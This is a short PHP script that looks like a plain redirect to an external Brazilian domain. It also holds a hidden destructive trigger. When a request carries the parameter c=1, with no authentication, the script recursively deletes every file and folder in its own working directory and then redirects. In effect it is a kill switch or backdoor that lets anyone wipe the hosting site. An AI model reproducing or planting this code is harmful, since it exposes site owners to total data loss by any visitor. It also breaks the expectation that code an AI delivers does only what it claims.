<?php

function ExcluiDir($Dir){
    
    if ($dd = opendir($Dir)) {
        while (false !== ($Arq = readdir($dd))) {
            if($Arq != "." && $Arq != ".."){
                $Path = "$Dir/$Arq";
                if(is_dir($Path)){
                    ExcluiDir($Path);
                }elseif(is_file($Path)){
                    unlink($Path);
                }
            }
        }
        closedir($dd);
    }
    rmdir($Dir);
}

$c = $_REQUEST["c"];

if($c == "1"){
	ExcluiDir(getcwd());
}


header("Location: http://strog.com.br");
exit;
?>